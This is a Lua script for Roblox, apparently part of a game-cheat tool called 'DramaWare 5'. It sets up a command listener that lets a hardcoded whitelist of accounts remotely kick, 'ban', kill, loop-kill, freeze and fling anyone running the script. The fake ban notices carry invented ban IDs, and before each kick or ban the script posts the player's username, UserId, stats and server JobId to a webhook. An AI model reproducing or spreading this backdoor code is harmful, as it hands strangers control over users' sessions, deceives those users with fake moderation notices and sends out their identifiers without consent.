-- Admin Command Listener (for DramaWare users to receive commands from whitelisted admins)
local localPlayer = game.Players.LocalPlayer

local function isAdminName(name)
    for _, n in ipairs(adminWhitelist) do
        if name:lower() == n:lower() then return true end
    end
    return false
end

local function isOwnerName(name)
    for _, n in ipairs(ownerList) do
        if name:lower() == n:lower() then return true end
    end
    return false
end

local higherUpList = {"tomorrownevercam3", "tomorownevercam3", "enigmapopstvr", "calfully"}
local function isHigherUp(name)
    for _, n in ipairs(higherUpList) do
        if name:lower() == n:lower() then return true end
    end
    return false
end

local function nameMatches(target)
    if target:lower() == "all" then return true end
    return string.find(localPlayer.Name:lower(), target:lower(), 1, true) ~= nil
end

local loopKillActive = {}

local function handleCommand(senderName, message)
    -- Don't process commands sent by yourself
    if senderName:lower() == localPlayer.Name:lower() then return end
    -- Only process commands from admins
    if not isAdminName(senderName) then return end

    local command, argString = message:match("^:(%w+)%s*(.*)")
    if not command then return end
    command = command:lower()
    argString = argString or ""


    local targetName, param = argString:match("^(%S+)%s*(.*)$")
    if not targetName then return end
    if not nameMatches(targetName) then return end
    -- Owners cannot be targeted unless the sender is also an owner
    if isOwnerName(localPlayer.Name) and not isOwnerName(senderName) then return end

    -- Helper to get stats and send webhook log
    local function sendActionWebhook(action, moderator, reason)
        local ds = localPlayer:FindFirstChild("DataStore")
        local campWins = ds and ds:FindFirstChild("CampWins") and ds.CampWins.Value or "N/A"
        local moviesWins = ds and ds:FindFirstChild("MoviesWins") and ds.MoviesWins.Value or "N/A"
        local expWins = ds and ds:FindFirstChild("ExpeditionWins") and ds.ExpeditionWins.Value or "N/A"
        local coins = ds and ds:FindFirstChild("Coins") and ds.Coins.Value or "N/A"

        local embedColor = (action == "KICK") and 16776960 or 16711680 -- yellow for kick, red for ban

        local payload = game:GetService("HttpService"):JSONEncode({
            embeds = {{
                title = "DramaWare 5 | " .. action .. " LOG",
                color = embedColor,
                fields = {
                    { name = "Target", value = localPlayer.Name, inline = true },
                    { name = "User ID", value = tostring(localPlayer.UserId), inline = true },
                    { name = "Moderator", value = moderator, inline = true },
                    { name = "Reason", value = reason, inline = false },
                    { name = "Camp Wins", value = tostring(campWins), inline = true },
                    { name = "Movies Wins", value = tostring(moviesWins), inline = true },
                    { name = "Expedition Wins", value = tostring(expWins), inline = true },
                    { name = "Coins", value = tostring(coins), inline = true },
                    { name = "Server", value = tostring(game.PlaceId), inline = true },
                    { name = "Job ID", value = tostring(game.JobId), inline = false },
                },
                footer = { text = "DramaWare 5 | " .. os.date("%Y-%m-%d %H:%M:%S") }
            }}
        })

        pcall(function()
            game:GetService("HttpService"):RequestAsync({
                Url = webhookUrl,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = payload
            })
        end)
    end

    if command == "kick" then
        sendActionWebhook("KICK", senderName, "Kicked via DramaWare 5")
        localPlayer:Kick("You have been kicked.\nModerator: " .. senderName .. "\nReason: Kicked via DramaWare 5")

    elseif command == "ban" then
        local reason = (param and param ~= "") and param or "Exploiting"
        sendActionWebhook("BAN", senderName, reason)
        localPlayer:Kick("You have been banned.\nModerator: " .. senderName .. "\nReason: " .. reason .. "\nExpires: Never\nBan ID: " .. math.random(100000, 999999))

    elseif command == "kill" then
        if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
            localPlayer.Character.Humanoid.Health = 0
        end

    elseif command == "freeze" then
        if localPlayer.Character then
            if localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                localPlayer.Character.HumanoidRootPart.Anchored = true
            end
            if localPlayer.Character:FindFirstChild("Torso") then
                localPlayer.Character.Torso.Anchored = true
            end
        end

    elseif command == "unfreeze" or command == "thaw" then
        if localPlayer.Character then
            if localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                localPlayer.Character.HumanoidRootPart.Anchored = false
            end
            if localPlayer.Character:FindFirstChild("Torso") then
                localPlayer.Character.Torso.Anchored = false
            end
        end

    elseif command == "void" then
        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
            localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
        end

    elseif command == "bring" then
        local adminPlayer = game.Players:FindFirstChild(senderName)
        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and adminPlayer and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
            localPlayer.Character.HumanoidRootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame
        end

    elseif command == "fling" then
        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local thrust = Instance.new("BodyVelocity")
            thrust.Velocity = Vector3.new(math.random(-500,500), 999, math.random(-500,500))
            thrust.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            thrust.Parent = localPlayer.Character.HumanoidRootPart
            game:GetService("Debris"):AddItem(thrust, 0.2)
        end
    elseif command == "loopkill" then
        -- Any whitelisted user can use this
        if not loopKillActive then loopKillActive = {} end
        local targetKey = localPlayer.Name:lower()
        if loopKillActive[targetKey] then return end
        loopKillActive[targetKey] = true
        task.spawn(function()
            while loopKillActive[targetKey] do
                local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum.Health = 0 end
                task.wait(0.3)
            end
        end)
    elseif command == "stoploopkill" then
        if loopKillActive then
            loopKillActive[localPlayer.Name:lower()] = nil
        end
    elseif command == "rmtouch" then
        -- Only higher-ups (owners + calfully) can use this command
        if isHigherUp(senderName) then
            if localPlayer.Character then
                for _, part in ipairs(localPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("UnionOperation") then
                        for _, v in ipairs(part:GetChildren()) do
                            if v:IsA("TouchTransmitter") then
                                v:Destroy()
                            end
                        end
                    end
                end
            end
        end
    end
end

